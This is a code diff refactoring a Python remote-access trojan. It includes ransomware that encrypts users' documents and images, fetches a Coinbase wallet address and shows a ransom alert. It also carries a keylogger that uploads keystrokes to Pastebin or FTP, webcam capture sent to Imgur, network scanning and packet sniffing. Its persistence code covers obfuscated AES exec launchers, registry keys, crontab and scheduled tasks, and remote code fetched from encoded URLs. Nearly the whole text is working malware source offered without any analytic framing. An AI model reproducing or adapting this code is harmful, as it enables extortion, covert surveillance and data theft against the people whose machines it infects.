@@ -72,7 +72,7 @@ import functools
 import threading
 import cStringIO
 import subprocess
-
+from collections import OrderedDict
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256, HMAC
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -80,6 +80,7 @@ from Crypto.Util.number import long_to_bytes, bytes_to_long
 from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
 
 if os.name is 'nt':
+    import win32com.client
     from pyHook import HookManager
     from pythoncom import PumpMessages
     from win32com.shell.shell import ShellExecuteEx
@@ -105,29 +106,66 @@ def config(*arg, **options):
 class Client(object):
 
     __name__    = 'Client'
-    _tasks      = Queue.Queue()
-    _lock       = threading.Lock()
+    _save       = None
     _abort      = False
     _debug      = True
+    _email      = None
+    _tasks      = Queue.Queue()
+    _lock       = threading.Lock()
+    _services   = {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
 
 
     def __init__(self, **kwargs):
-        self._jobs      = {}
-        self._results   = {}
-        self._networks  = {}
-        self._session   = {'connection': threading.Event(), 'prompt': threading.Event()}
-        self._services  = {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
-        self._info      = {k:v for k,v in zip(['id', 'ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'device', 'encryption'], [Client._get_client_id(), Client._get_public_ip(), Client._get_local_ip(), sys.platform, Client._get_mac_address(), Client._get_architecture(), Client._get_username(), Client._get_if_admin(), Client._get_device_name(), Client._get_cipher()])}
-        self._commands  = {cmd: {'method': getattr(self, cmd), 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip(), 'platforms': getattr(Client, cmd).platforms} for cmd in vars(Client) if hasattr(vars(Client)[cmd], 'command')}
-        self._setup     = [setattr(self, '__{}__'.format(x), kwargs.get(x)) for x in kwargs]; True
+        self._jobs      = OrderedDict()
+        self._results   = OrderedDict()
+        self._networks  = OrderedDict()
+        self._session   = OrderedDict()
+        self._system    = Client._get_system()
+        self._commands  = Client._get_commands(self)
+        self._setup     = Client._get_setup(self, **kwargs)
+
 
 
     @staticmethod
-    def _get_cipher():
+    def _get_setup(self, **kwargs):
+        for key, value in kwargs.items():
+            try:
+                setattr(self, '__%s__' % key, value)
+            except Exception as e:
+                Client.debug("{} error: {}".format(Client._get_setup.func_name, str(e)))
+  
+
+    @staticmethod
+    def _get_commands(self):
+        commands = {}
+        for cmd in vars(Client):
+            if hasattr(vars(Client)[cmd], 'command'):
+                try:
+                    commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(Client, cmd).platforms, 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip()}
+                except Exception as e:
+                    Client.debug("{} error: {}".format(self._get_commands.func_name, str(e)))
+        return commands
+
+        
+    @staticmethod
+    def _get_system():
+        info = {}
+        for key in ['id', 'public_ip', 'private_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device', 'encryption']:
+            value = '_get_%s' % key
+            if hasattr(Client, value):
+                try:
+                    info[key] = getattr(Client, value)()
+                except Exception as e:
+                    Client.debug("{} error: {}".format(Client._get_system.func_name, str(e)))
+        return info
+
+
+    @staticmethod
+    def _get_encryption():
         try:
             return 'aes' if bool('AES' in globals() and 'SHA256' in globals() and 'HMAC' in globals()) else 'xor'
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_cipher.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_encryption.func_name, str(e)))
 
 
     @staticmethod
@@ -135,7 +173,7 @@ class Client(object):
         try:
             return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_xor.func_name, str(e)))
 
 
     @staticmethod
@@ -143,7 +181,7 @@ class Client(object):
         try:
             return bytes(s) + (int(block_size) - len(bytes(s)) % int(block_size)) * bytes(padding)
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_padded.func_name, str(e)))
 
 
     @staticmethod
@@ -151,18 +189,21 @@ class Client(object):
         try:
             return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_blocks.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_blocks.func_name, str(e)))
 
 
     @staticmethod
     def _get_primes(n):
-        sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
-        for i in xrange(1,int(n**0.5)/3+1):
-            if sieve[i]:
-                k=3*i+1|1
-                sieve[       k*k/3     ::2*k] = False
-                sieve[k*(k-2*(i&1)+4)/3::2*k] = False
-        return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]
+        try:
+            sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
+            for i in xrange(1,int(n**0.5)/3+1):
+                if sieve[i]:
+                    k=3*i+1|1
+                    sieve[       k*k/3     ::2*k] = False
+                    sieve[k*(k-2*(i&1)+4)/3::2*k] = False
+            return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]
+        except Exception as e:
+            Client.debug("{} error: {}".format(Client._get_primes.func_name, str(e)))
 
 
     @staticmethod
@@ -170,7 +211,7 @@ class Client(object):
         try:
             return (Client._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(Client._get_primes(i)) == p).next()     
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_nth_prime.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_nth_prime.func_name, str(e)))
 
 
     @staticmethod
@@ -181,7 +222,7 @@ class Client(object):
             c = Client._get_primes(b)
             return base64.b64encode("".join([(chr(a.pop()) if n in c else os.urandom(1)) for n in xrange(b)]))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_obfuscated.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_obfuscated.func_name, str(e)))
 
 
     @staticmethod
@@ -189,7 +230,23 @@ class Client(object):
         try:
             return bytes().join(chr(bytearray(base64.b64decode(bytes(block)))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(bytes(block))))))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_deobfuscated.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_deobfuscated.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_id():
+        try:
+            return SHA256.new(Client._get_public_ip() + Client._get_mac_address()).hexdigest()
+        except Exception as e:
+            Client.debug("{} error: {}".format(Client._get_id.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_platform():
+        try:
+            return sys.platform
+        except Exception as e:
+            Client.debug("{} error: {}".format(Client._get_platform.func_name, str(e)))
 
 
     @staticmethod
@@ -197,15 +254,15 @@ class Client(object):
         try:
             return urllib2.urlopen('http://api.ipify.org').read()
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_public_ip.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_public_ip.func_name, str(e)))
 
 
     @staticmethod
-    def _get_local_ip():
+    def _get_private_ip():
         try:
             return socket.gethostbyname(socket.gethostname())
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_local_ip.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_private_ip.func_name, str(e)))
 
 
     @staticmethod
@@ -213,31 +270,7 @@ class Client(object):
         try:
             return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_mac_address.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_username():
-        try:
-            return os.getenv('USER', os.getenv('USERNAME'))
-        except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_username.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_device_name():
-        try:
-            return os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))
-        except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_device_name.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_client_id():
-        try:
-            return SHA256.new(Client._get_public_ip() + Client._get_mac_address()).hexdigest()
-        except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_client_id.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_mac_address.func_name, str(e)))
 
 
     @staticmethod
@@ -245,7 +278,31 @@ class Client(object):
         try:
             return int(struct.calcsize('P') * 8)
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_architecture.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_architecture.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_device():
+        try:
+            return os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))
+        except Exception as e:
+            Client.debug("{} error: {}".format(Client._get_device.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_username():
+        try:
+            return os.getenv('USER', os.getenv('USERNAME'))
+        except Exception as e:
+            Client.debug("{} error: {}".format(Client._get_username.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_administrator():
+        try:
+            return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
+        except Exception as e:
+            Client.debug("{} error: {}".format(Client._get_administrator.func_name, str(e)))      
 
 
     @staticmethod
@@ -256,29 +313,20 @@ class Client(object):
         except:
             return False
 
-
-    @staticmethod
-    def _get_if_admin():
-        try:
-            return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
-        except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_if_admin.func_name, str(e)))      
-
-
     @staticmethod
     def _get_random_var(x=6):
         try:
-            return str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(x)))
+            return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(x)-1))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_nth_prime.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_random_var.func_name, str(e)))
 
 
     @staticmethod
-    def _get_config(x):
+    def _get_user_config(x):
         try:
             return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_user_config.func_name, str(e)))
 
 
     @staticmethod            
@@ -291,7 +339,7 @@ class Client(object):
                   '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
             return ', '.join([i for i in data if i])
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_job_status.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_job_status.func_name, str(e)))
 
             
     @staticmethod
@@ -303,7 +351,18 @@ class Client(object):
                 req.headers[key] = value
             return urllib2.urlopen(req).read()
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_post_request.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_post_request.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_windows_alert(text, title):
+        try:
+            t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
+            t.daemon = True
+            t.start()
+            return t
+        except Exception as e:
+            Client.debug("{} error: {}".format(Client._get_windows_alert.func_name, str(e)))
 
 
     @staticmethod
@@ -313,11 +372,11 @@ class Client(object):
                 try:
                     setattr(getattr(Client, target), k, v)
                 except Exception as e:
-                    Client.debug("{} returned error: {}".format(Client._get_new_option.func_name, str(e)))
+                    Client.debug("{} error: {}".format(Client._get_new_option.func_name, str(e)))
                     
 
     @staticmethod
-    def _get_data(source):
+    def _get_normalized_data(source):
         try:
             if os.path.isfile(str(source)):
                 return open(source, 'rb').read()
@@ -330,7 +389,7 @@ class Client(object):
             else:
                 return bytes(source)
         except Exception as e2:
-            Client.debug("{} returned error: {}".format(Client._upload_imgur.func_name, str(e2)))
+            Client.debug("{} error: {}".format(Client._upload_imgur.func_name, str(e2)))
 
 
     @staticmethod
@@ -348,12 +407,12 @@ class Client(object):
                 CloseKey(reg_key)
             return True
         except Exception as e:
-            Client.debug("{} returned error: {}".format(str(e)))
+            Client.debug("{} error: {}".format(str(e)))
         return False
 
 
     @staticmethod
-    def _get_png(image):
+    def _get_png_from_data(image):
         try:
             if type(image) == numpy.ndarray:
                 width, height = (image.shape[1], image.shape[0])
@@ -383,17 +442,17 @@ class Client(object):
             fileh.seek(0)
             return fileh
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_png.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_png_from_data.func_name, str(e)))
             
 
     @staticmethod
     @config(api_key=None, endpoint=None)
     def _get_remote_server():
         try:
-            url = Client._get_config(endpoint)
+            url = Client._get_user_config(endpoint)
             if url.startswith('http'):
                 req = urllib2.Request(url)
-                api = Client._get_config(api_key)
+                api = Client._get_user_config(api_key)
                 req.headers = {'API-Key': api}
                 res = json.loads(urllib2.urlopen(req).read())
                 ip  = res[res.keys()[0]][0].get('ip')
@@ -404,7 +463,7 @@ class Client(object):
             else:
                 Client.debug("Error: invalid API endpoint: '{}'".format(str(endpoint)))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._get_remote_server.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_remote_server.func_name, str(e)))
         return socket.gethostbyname(socket.gethostname())
 
 
@@ -429,7 +488,7 @@ class Client(object):
                 result.append(output)
             return base64.b64encode(b"".join(result))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._encrypt_xor.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._encrypt_xor.func_name, str(e)))
 
 
     @staticmethod
@@ -455,7 +514,7 @@ class Client(object):
                 result.append(output)
             return "".join(result).rstrip(chr(0))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._decrypt_xor.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._decrypt_xor.func_name, str(e)))
 
 
     @staticmethod
@@ -468,7 +527,7 @@ class Client(object):
             hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
             return base64.b64encode(ciphertext + hmac_sha256)
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._encrypt_aes.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._encrypt_aes.func_name, str(e)))
 
 
     @staticmethod
@@ -482,24 +541,24 @@ class Client(object):
             Client.debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
             return cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(chr(0))
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._decrypt_aes.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._decrypt_aes.func_name, str(e)))
 
 
     @staticmethod
     @config(api_key=None)
     def _upload_imgur(source):
         try:
-            data = Client._get_data(source)
+            data = Client._get_normalized_data(source)
             return json.loads(Client._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')
         except Exception as e2:
-            Client.debug("{} returned error: {}".format(Client._upload_imgur.func_name, str(e2)))
+            Client.debug("{} error: {}".format(Client._upload_imgur.func_name, str(e2)))
 
 
     @staticmethod
     @config(api_dev_key=None, api_user_key=None)
     def _upload_pastebin(source):
         try:
-            data = Client._get_data(source)
+            data = Client._get_normalized_data(source)
             info = {'api_option': 'paste', 'api_paste_code': data}
             info.update({'api_user_key': Client._upload_pastebin.api_user_key}) if hasattr(Client._upload_pastebin, 'api_user_key') else None
             info.update({'api_dev_key' : Client._upload_pastebin.api_dev_key}) if hasattr(Client._upload_pastebin, 'api_dev_key') else None
@@ -542,36 +601,33 @@ class Client(object):
             stor = host.storbinary('STOR ' + path, source)
             return path
         except Exception as e2:
-            Client.debug("{} returned error: {}".format(Client._upload_ftp.func_name, str(e2)))
+            Client.debug("{} error: {}".format(Client._upload_ftp.func_name, str(e2)))
 
 
     @staticmethod
-    @config(account_id=None, api_key=None, api_secret=None, wallet_address=None)
-    def _ransom_payment():
+    @config(account_id=None, api_key=None, api_secret=None, api_version=None, wallet_address=None, target_url=None)
+    def _ransom_payment(session_id):
         try:
-            Client._ransom_payment.wallet_address = Client._get_new_wallet()
-            Client.debug("Bitcoin wallet address: {}".format(Client._ransom_payment.wallet_address))
+            return Client._get_windows_alert("Your personal files have been encrypted. Wallet Address: {} Session ID: {} To decrypt your files, click the link and follow the instructions using the above information: {}".format(Client._ransom_payment.wallet_address, session_id, target_url), "ALERT! Action Required")
         except Exception as e:
-            Client.debug("{} returned error: {}".format(Client._ransom_payment.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._ransom_payment.func_name, str(e)))
 
-
+                
     def _ransom_encrypt(self, args):
         try:
             if 'public_key' in self._session:
-                path, sock  = args
                 if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp']:
                     aes_key = SHA256.new(os.urandom(16)).hexdigest()
-                    ransom  = self.encrypt(path, key=aes_key)
+                    ransom  = self._encrypt_file(path, key=aes_key)
                     cipher  = PKCS1_OAEP.new(self._session['public_key'])
                     key     = base64.b64encode(cipher.encrypt(aes_key))
                     task_id = self._get_task_id(self.ransom.func_name)
-                    data    = {'file_path': path.replace('/', '?').replace('\\', '?'), 'aes_key': key}
-                    task    = {'id': task_id, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': self.ransom.func_name, 'data': data}
-                    sock.sendall(self._encrypt(json.dumps(task)) + '\n')
+                    task    = {'client_id': self._system['id'], 'session_id': self._session['id'], 'task': self.ransom.func_name, 'data': {'file_path': path.replace('/', '?').replace('\\', '?'), 'aes_key': key}}
+                    self._results[task_id] = task
             else:
                 self.debug("No RSA Public Key found")
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._ransom_encrypt.func_name, str(e)))
+            self.debug("{} error: {}".format(self._ransom_encrypt.func_name, str(e)))
 
 
     def _ransom_decrypt(self, task):
@@ -580,14 +636,33 @@ class Client(object):
                 path    = task['data']['file_path'].replace('?', '/')
                 cipher  = PKCS1_OAEP.new(self._session['private_key'])
                 aes_key = cipher.decrypt(base64.b64decode(task['data']['aes_key']))
-                path    = self.decrypt(path, key=aes_key)
-                remove  = self._results.pop(task_id, None)
-                self.debug("Successfully restored {}".format(path))
+                path    = self._decrypt_file(path, key=aes_key)
+                remove  = self._results.pop(task['id'], None)
             else:
                 self.debug("No RSA Private Key found")
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._ransom_decrypt.func_name, str(e)))
+            self.debug("{} error: {}".format(self._ransom_decrypt.func_name, str(e)))
                 
+
+    def _ransom_wallet_address(self):
+        try:
+            api_key         = getattr(Client._ransom_payment, 'api_key')
+            api_secret      = getattr(Client._ransom_payment, 'api_secret')
+            api_version     = getattr(Client._ransom_payment, 'api_version')
+            account_id      = getattr(Client._ransom_payment, 'account_id')
+            timestamp       = bytes(int(time.time()))
+            name            = bytes(self._session.get('id'))
+            url             = bytes('https://api.coinbase.com/v2/accounts/{}/addresses'.format(account_id))
+            data            = bytes(urllib.urlencode({'name': name}))
+            path            = bytes(urllib2.urlparse.urlparse(url)[2])
+            message         = bytes(timestamp + 'POST' + path + data)
+            signature       = bytes(HMAC.new(api_secret, msg=message, digestmod=SHA256).hexdigest())
+            request         = urllib2.Request(url, data=data)
+            request.headers = {'Content-Type': 'application/json','CB-VERSION': api_version,'CB-ACCESS-KEY': api_key,'CB-ACCESS-SIGN': signature,'CB-ACCESS-TIMESTAMP': timestamp}
+            return json.loads(urllib2.urlopen(request).read())['data']['address'].encode()
+        except Exception as e:
+            self.debug("{} error: {}".format(self._ransom_wallet_address.func_name, str(e)))
+
 
     def _keylogger(self, *args, **kwargs):
         while True:
@@ -605,20 +680,19 @@ class Client(object):
 
 
     def _keylogger_manager(self, *args, **kwargs):
-        try:
-            while True:
+        while True:
+            try:
                 if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
                     result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
                     task_id = self._get_task_id(self.keylogger.func_name)
-                    task    = {'id': task_id, 'session_id': self._session['id'], 'client_id': self._info['id'], 'task': self.keylogger.func_name, 'data': result}
+                    task    = {'id': task_id, 'session_id': self._session['id'], 'client_id': self._system['id'], 'task': self.keylogger.func_name, 'data': result}
                     self._results[time.ctime()] = task
                     self.keylogger.buffer.reset()
-                    self._tasks.put_nowait((self._report, task))
                 else:
                     time.sleep(5)
-        except Exception as e:
-            self.debug("{} returned error: {}".format(self._keylogger_manager.func_name, str(e)))
-
+            except Exception as e:
+                self.debug("{} error: {}".format(self._keylogger_manager.func_name, str(e)))
+                break
 
     def _keylogger_event(self, event):
         try:
@@ -637,7 +711,7 @@ class Client(object):
             else:
                 pass
         except Exception as e:
-            self.debug('{} returned error: {}'.format(self._keylogger_event.func_name, str(e)))
+            self.debug('{} error: {}'.format(self._keylogger_event.func_name, str(e)))
         return True
 
 
@@ -693,7 +767,7 @@ class Client(object):
 
     def _scan_network(self, *args):
         try:
-            stub = '.'.join(str(self._info['local']).split('.')[:-1]) + '.%d'
+            stub = '.'.join(str(self._system['private_ip']).split('.')[:-1]) + '.%d'
             lan  = []
             for i in xrange(1,255):
                 lan.append(stub % i)
@@ -723,7 +797,7 @@ class Client(object):
             dev.release()
             if not r:
                 return "Unable to access webcam"
-            png = self._get_png(f)
+            png = self._get_png_from_data(f)
             return self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
         except Exception as e:
             return '{} error: {}'.format(self._webcam_image.func_name, str(e))
@@ -755,11 +829,7 @@ class Client(object):
         try:
             if not port:
                 return self.webcam.usage
-            try:
-                host = self._session['socket'].getpeername()[0]
-            except socket.error:
-                self._session['connection'].clear()
-                return self.connect()
+            host = self._session['socket'].getpeername()[0]
             port = int(port)
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             while retries > 0:
@@ -769,7 +839,7 @@ class Client(object):
                     retries -= 1
                 break
             if not retries:
-                return 'Stream failed - connection error'
+                return 'Error: webcam stream unable to connect to server'
             dev = VideoCapture(0)
             try:
                 t1 = time.time()
@@ -783,32 +853,29 @@ class Client(object):
                         self.debug('Stream error: {}'.format(str(e)))
                         break
             finally:
-                try:
-                    dev.release()
-                    sock.close()
-                except: pass
+                dev.release()
+                sock.close()
         except Exception as e:
             return '{} error: {}'.format(self._webcam_stream.func_name, str(e))
 
 
-    @config(platfomrs=['win32','linux2','darwin'])
+    @config(platforms=['win32','linux2','darwin'])
     def _persistence_add_encrypted_launcher(self):        
         try:
             if hasattr(self, '__l__'):
                 output      = []
-                data        = self._get_config(self.__l__).splitlines()
-                b64var      = self._get_random_var()
-                aesvar      = self._get_random_var()
+                data        = self._get_user_config(self.__l__).splitlines()
+                b64var      = self._get_random_var(6)
+                aesvar      = self._get_random_var(6)
                 key         = self._get_random_var(32)
                 iv          = self._get_random_var(16)
-                aes_encrypt = lambda c, s: base64.b64encode(c.encrypt(self._get_padded(s, AES.block_size, '{')))
-                output_file = "launcher_%d.py" % (random.randrange(1000))
+                output_file = "launcher_%s.py" % (self._get_random_var(3))
                 imports     = ["from __future__ import print_function", "from base64 import b64decode as %s" % b64var, "from Crypto.Cipher import AES as %s" % aesvar] 
+                _           = [(imports.append(line.strip()) if "import" in line and "__future__" not in line else output.append(line)) for line in data]
                 cipher      = AES.new(key, AES.MODE_CBC, iv)
-                ciphertext  = aes_encrypt(cipher, "\n".join(output))
-                [(imports.append(line.strip()) if "import" in line and "__future__" not in line else output.append(line)) for line in data]
-                with file(output_file, 'w'):
-                    fp.write(";".join(imports) + "\nexec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\", 2).decrypt(%s(\"%s\")).rstrip('{'))" %(aesvar, key, b64var, ciphertext))))
+                ciphertext  = base64.b64encode(cipher.encrypt(self._get_padded('\n'.join(output), AES.block_size, '{')))
+                with file(output_file, 'w') as fp:
+                    fp.write(";".join(imports) + "\nexec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\", 2).decrypt(%s(\"%s\")).rstrip('{'))" % (aesvar, key, b64var, ciphertext))))
                 return (True, output_file)
         except Exception as e:
             return (False, '{} error: {}'.format(self._persistence_add_encrypted_launcher.func_name, str(e)))
@@ -818,22 +885,17 @@ class Client(object):
     def _persistence_remove_encrypted_launcher(self):
         try:
             target = self.persistence.methods.get('encrypted_launcher').get('result')
-            if target:
-                if os.path.isfile(target):
-                    os.remove(target)
-                    if os.name is 'nt':
-                        unhide = os.popen('attrib -h %s' % target).read()
-                        delete = os.popen('del /f %s' % target).read()
-                    else:
-                        delete = os.popen('rm -f %s' % target).read()
-                    return True
-                else:
-                    self.debug("File '{}' not found".format(target))
+            if isinstance(target, bytes) and os.path.isfile(target):
+                if os.name is 'nt':
+                    unhide = os.popen('attrib -h %s' % target).read()
+                os.remove(target)
+                return True
             else:
-                self.debug("No encrypted launcher has been generated yet")
+                self.debug("File '{}' not found".format(target))
         except Exception as e:
             self.debug('{} error: {}'.format(self._persistence_remove_encrypted_launcher.func_name, str(e)))
         return False
+
 
     @config(platforms=['win32','linux2','darwin'])
     def _persistence_add_hidden_file(self):
@@ -868,7 +930,7 @@ class Client(object):
                     if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                         return True
                 except Exception as e:
-                    self.debug('{} returned error: {}'.format(self._persistence_remove_hidden_file.func_name, str(e)))
+                    self.debug('{} error: {}'.format(self._persistence_remove_hidden_file.func_name, str(e)))
         return False 
 
 
@@ -894,14 +956,14 @@ class Client(object):
                                         fd.write('\n' + task + '\n')
                                 return (True, name)
                             except Exception as e:
-                                self.debug("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
+                                self.debug("{} error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                                 try:
                                     os.remove(name)
                                 except: pass
                     else:
                         return (True, name)
                 except Exception as e:
-                    self.debug("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
+                    self.debug("{} error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                     try:
                         os.remove(name)
                     except: pass
@@ -933,7 +995,7 @@ class Client(object):
             value = long_to_bytes(long(self.__f__))
             if value and os.path.isfile(value):
                 try:
-                    code    = urllib2.urlopen(self._get_config(long(self.__g__))).read()
+                    code    = urllib2.urlopen(self._get_user_config(long(self.__g__))).read()
                     label   = name
                     if not os.path.exists('/var/tmp'):
                         os.makedirs('/var/tmp')
@@ -979,7 +1041,7 @@ class Client(object):
                     cmd     = 'SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, task_run)
                     result  = subprocess.check_output(cmd, shell=True)
                     if 'SUCCESS' in result:
-                        return (True, result)
+                        return (True, result.replace('"', ''))
                 except Exception as e:
                     self.debug('Add scheduled task error: {}'.format(str(e)))
         return (False, None)
@@ -1011,7 +1073,7 @@ class Client(object):
                             fp.write(content)
                     return (True, startup_file)
                 except Exception as e:
-                    self.debug('{} returned error: {}'.format(self._persistence_add_startup_file.func_name[1:], str(e)))
+                    self.debug('{} error: {}'.format(self._persistence_add_startup_file.func_name, str(e)))
         return (False, None)
 
 
@@ -1044,7 +1106,7 @@ class Client(object):
                     self._get_registry_key(name, value)
                     return (True, name)
                 except Exception as e:
-                    self.debug('{} returned error: {}'.format(self._persistence_add_registry_key.func_name[1:], str(e)))
+                    self.debug('{} error: {}'.format(self._persistence_add_registry_key.func_name, str(e)))
         return (False, None)
 
 
@@ -1175,69 +1237,176 @@ class Client(object):
         except Exception as e:
             self.packetsniffer.capture.append("Error in {} header: '{}'".format('ETH', str(e)))
 
+                    
+    def _process_list(self):
+        try:
+            output  = {}
+            procs   = psutil.process_iter()
+            for p in procs:
+                try:
+                    if len(json.dumps(output)) < 4096:
+                        output.update({str(p.pid).encode(): "{:>20} | {:>10}".format(str(p.name())[:19], str(p.status())).encode()})
+                    else:
+                        break
+                except Exception as e:
+                    Client.debug(str(e))
+                    break
